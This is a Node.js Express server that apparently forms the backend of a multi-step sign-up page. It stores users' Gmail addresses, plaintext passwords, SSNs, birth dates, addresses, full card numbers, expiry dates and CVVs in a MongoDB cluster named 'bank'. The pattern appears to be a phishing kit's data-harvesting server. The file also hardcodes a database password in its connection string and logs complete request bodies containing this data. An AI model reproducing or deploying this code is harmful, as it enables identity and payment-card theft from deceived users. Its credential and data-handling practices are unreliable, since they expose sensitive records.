const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

// Serve static files from the current directory
app.use(express.static(path.join(__dirname)));

// Connect to local MongoDB
dbUrl = 'mongodb+srv://guymumm:m8TYZjz6f4ufOJa4@bank.hltbyob.mongodb.net/';
mongoose.connect(dbUrl, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const UserSchema = new mongoose.Schema({
  firstName: String,
  middleName: String,
  lastName: String,
  gmail: String,
  password: String,
  number: String,
  // Add fields for step 2 and 3
  identity: String,
  dob: String,
  ssn: String,
  address: String,
  apt: String,
  city: String,
  state: String,
  zip: String,
  country: String,
  cardName: String,
  cardNumber: String,
  expDate: String,
  cvv: String,
  paymentMethod: String
});
const User = mongoose.model('User', UserSchema);

app.post('/api/signup', async (req, res) => {
  try {
    const user = new User(req.body);
    await user.save();
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Add endpoint to update user with step 2 info
app.post('/api/signup/step2', async (req, res) => {
  try {
    const { gmail, ...personalInfo } = req.body;
    console.log('STEP2 received:', req.body);
    if (!gmail) return res.status(400).json({ success: false, error: 'Missing gmail' });
    const user = await User.findOneAndUpdate(
      { gmail },
      { $set: personalInfo },
      { new: true }
    );
    console.log('STEP2 updated user:', user);
    if (!user) return res.status(404).json({ success: false, error: 'User not found' });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Add endpoint to update user with step 3 (payment) info
app.post('/api/signup/step3', async (req, res) => {
  try {
    const { gmail, ...paymentInfo } = req.body;
    console.log('STEP3 received:', req.body);
    if (!gmail) return res.status(400).json({ success: false, error: 'Missing gmail' });
    const user = await User.findOneAndUpdate(
      { gmail },
      { $set: paymentInfo },
      { new: true }
    );
    console.log('STEP3 updated user:', user);
    if (!user) return res.status(404).json({ success: false, error: 'User not found' });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
